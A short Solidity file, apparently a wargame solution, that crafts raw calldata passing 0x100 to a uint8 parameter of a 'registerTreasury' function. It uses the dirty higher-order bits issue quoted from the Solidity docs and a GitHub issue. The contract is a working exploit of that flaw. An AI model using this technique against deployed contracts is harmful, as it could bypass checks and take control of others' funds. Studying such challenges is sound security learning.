// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IHigherOrder {
    function registerTreasury(uint8) external;
}

/*
  https://docs.soliditylang.org/en/latest/security-considerations.html#minor-details
  > Types that do not occupy the full 32 bytes might contain “dirty higher order bits”.
  > This is especially important if you access msg.data - it poses a malleability risk:
  > You can craft transactions that call a function f(uint8 x) with a raw byte argument of 0xff000001 and with 0x00000001.
  > Both are fed to the contract and both will look like the number 1 as far as x is concerned,
  > but msg.data will be different, so if you use keccak256(msg.data) for anything, you will get different results.

  https://github.com/ethereum/solidity/issues/14766 (closed)
  > This no longer seems to be true in Solidity >= 0.8. ABI decoding now reverts when it encounters dirty high-order bits.
  > Can you please confirm this is no longer an issue and add a comment to the documentation (or remove this section),
  > or clarify why this is still an issue in Solidity >= 0.8?
*/

contract MyHigherOrderAttack {
    constructor(address target) {
        bytes memory payload = bytes.concat(IHigherOrder.registerTreasury.selector, bytes32(uint256(0x100)));

        (bool success, ) = target.call(payload);
        success;
    }
}
